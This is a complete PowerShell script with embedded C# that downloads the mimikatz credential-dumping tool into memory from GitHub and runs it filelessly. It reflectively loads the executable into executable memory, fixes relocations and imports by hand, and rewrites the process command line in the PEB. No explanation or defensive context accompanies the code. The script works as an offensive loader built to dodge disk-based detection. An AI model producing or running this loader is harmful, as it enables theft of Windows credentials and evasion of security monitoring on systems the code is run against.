[void][Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$zd = (New-Object Net.WebClient).DownloadData('https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip')
$ms = New-Object System.IO.MemoryStream(,$zd)
$za = New-Object System.IO.Compression.ZipArchive($ms,[System.IO.Compression.ZipArchiveMode]::Read)
$ent = $za.Entries | Where-Object { $_.FullName -match 'x64/mimikatz\.exe$' } | Select -First 1
$es = $ent.Open()
$pe = New-Object byte[] $ent.Length
$es.Read($pe, 0, $pe.Length) | Out-Null
$es.Close(); $za.Dispose(); $ms.Dispose()

Add-Type -Language CSharp @"
using System;
using System.Runtime.InteropServices;

public class MkFinal {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
    [DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, ref uint t);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32")] public static extern bool AllocConsole();
    [DllImport("ntdll")]    public static extern int NtQueryInformationProcess(
        IntPtr h, int cls, ref PROCESS_BASIC_INFORMATION pbi, int sz, out int ret);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    public static void Copy(byte[] src, int off, IntPtr dst, int cnt) { Marshal.Copy(src, off, dst, cnt); }

    public static void ClearCommandLine() {
        var pbi = new PROCESS_BASIC_INFORMATION();
        int ret;
        NtQueryInformationProcess((IntPtr)(-1), 0, ref pbi, Marshal.SizeOf(pbi), out ret);

        // PEB->ProcessParameters at PEB+0x20 (x64)
        IntPtr procParams = Marshal.ReadIntPtr((IntPtr)(pbi.PebBaseAddress.ToInt64() + 0x20));

        // Wide CommandLine UNICODE_STRING at RTL_USER_PROCESS_PARAMETERS+0x70
        IntPtr ustrAddr  = (IntPtr)(procParams.ToInt64() + 0x70);
        short  curLen    = Marshal.ReadInt16(ustrAddr);
        IntPtr bufPtr    = Marshal.ReadIntPtr((IntPtr)(ustrAddr.ToInt64() + 8));

        string stub      = "mimikatz.exe";
        int    stubBytes = stub.Length * 2;
        for (int i = 0; i < curLen / 2; i++) {
            short ch = (i < stub.Length) ? (short)stub[i] : (short)0;
            Marshal.WriteInt16((IntPtr)(bufPtr.ToInt64() + i * 2), ch);
        }
        Marshal.WriteInt16(ustrAddr, (short)stubBytes);

        // Ansi CommandLine at RTL_USER_PROCESS_PARAMETERS+0x60
        IntPtr ustrAddrA  = (IntPtr)(procParams.ToInt64() + 0x60);
        short  curLenA    = Marshal.ReadInt16(ustrAddrA);
        IntPtr bufPtrA    = Marshal.ReadIntPtr((IntPtr)(ustrAddrA.ToInt64() + 8));

        string stubA      = "mimikatz.exe";
        int    stubBytesA = stubA.Length;
        for (int i = 0; i < curLenA; i++) {
            byte ch = (i < stubA.Length) ? (byte)stubA[i] : (byte)0;
            Marshal.WriteByte((IntPtr)(bufPtrA.ToInt64() + i), ch);
        }
        Marshal.WriteInt16(ustrAddrA, (short)stubBytesA);
    }

    public static string Run(byte[] pe) {
        int elf      = BitConverter.ToInt32(pe, 0x3C);
        int oh       = elf + 24;
        uint imgSz   = BitConverter.ToUInt32(pe, oh + 56);
        uint epRVA   = BitConverter.ToUInt32(pe, oh + 16);
        long imgBase = BitConverter.ToInt64(pe,  oh + 24);
        uint hdrSz   = BitConverter.ToUInt32(pe, oh + 60);
        ushort nSec  = BitConverter.ToUInt16(pe, elf + 6);

        IntPtr mem = VirtualAlloc(IntPtr.Zero, imgSz, 0x3000, 0x40);
        if (mem == IntPtr.Zero) return "alloc fail";

        Copy(pe, 0, mem, (int)hdrSz);

        int secBase = oh + 240;
        for (int i = 0; i < nSec; i++) {
            int s    = secBase + i * 40;
            uint va  = BitConverter.ToUInt32(pe, s + 12);
            uint raw = BitConverter.ToUInt32(pe, s + 16);
            uint ptr = BitConverter.ToUInt32(pe, s + 20);
            if (raw > 0) Copy(pe, (int)ptr, (IntPtr)(mem.ToInt64() + va), (int)raw);
        }

        long delta = mem.ToInt64() - imgBase;
        if (delta != 0) {
            uint rRVA = BitConverter.ToUInt32(pe, oh + 152);
            uint rSz  = BitConverter.ToUInt32(pe, oh + 156);
            if (rRVA > 0) {
                int ro = 0;
                while (ro < (int)rSz) {
                    int pRVA = Marshal.ReadInt32((IntPtr)(mem.ToInt64() + rRVA + ro));
                    int bSz  = Marshal.ReadInt32((IntPtr)(mem.ToInt64() + rRVA + ro + 4));
                    if (bSz <= 8) break;
                    for (int j = 0; j < (bSz - 8) / 2; j++) {
                        short en = Marshal.ReadInt16((IntPtr)(mem.ToInt64() + rRVA + ro + 8 + j * 2));
                        int tp   = (en >> 12) & 0xF;
                        int of2  = en & 0xFFF;
                        if (tp == 10) {
                            IntPtr fa = (IntPtr)(mem.ToInt64() + pRVA + of2);
                            Marshal.WriteInt64(fa, Marshal.ReadInt64(fa) + delta);
                        }
                    }
                    ro += bSz;
                }
            }
        }

        uint iRVA = BitConverter.ToUInt32(pe, oh + 120);
        int fc = 0;
        if (iRVA > 0) {
            int idx = 0;
            while (true) {
                IntPtr ip   = (IntPtr)(mem.ToInt64() + iRVA + idx * 20);
                int nRVA2   = Marshal.ReadInt32(ip, 12);
                if (nRVA2 == 0) break;
                string dll  = Marshal.PtrToStringAnsi((IntPtr)(mem.ToInt64() + nRVA2));
                IntPtr hDll = LoadLibraryA(dll);
                int ft      = Marshal.ReadInt32(ip, 16);
                if (ft == 0) ft = Marshal.ReadInt32(ip, 0);
                int to = 0;
                while (true) {
                    long th = Marshal.ReadInt64((IntPtr)(mem.ToInt64() + ft + to));
                    if (th == 0) break;
                    IntPtr fn;
                    if ((th & unchecked((long)0x8000000000000000)) != 0)
                        fn = GetProcAddress(hDll, ((int)(th & 0xFFFF)).ToString());
                    else {
                        int hr    = (int)(th & 0x7FFFFFFF);
                        string nm = Marshal.PtrToStringAnsi((IntPtr)(mem.ToInt64() + hr + 2));
                        fn = GetProcAddress(hDll, nm);
                    }
                    Marshal.WriteInt64((IntPtr)(mem.ToInt64() + ft + to), fn.ToInt64());
                    fc++; to += 8;
                }
                idx++;
            }
        }

        AllocConsole();
        ClearCommandLine();

        IntPtr ep = (IntPtr)(mem.ToInt64() + epRVA);
        uint tid = 0;
        IntPtr ht = CreateThread(IntPtr.Zero, 0, ep, IntPtr.Zero, 0, ref tid);
        WaitForSingleObject(ht, 0xFFFFFFFF);
        return "OK:fc=" + fc;
    }
}
"@

Write-Host "Running mimikatz interactively via reflective load..."
$r = [MkFinal]::Run($pe)
Write-Host "Result: $r"
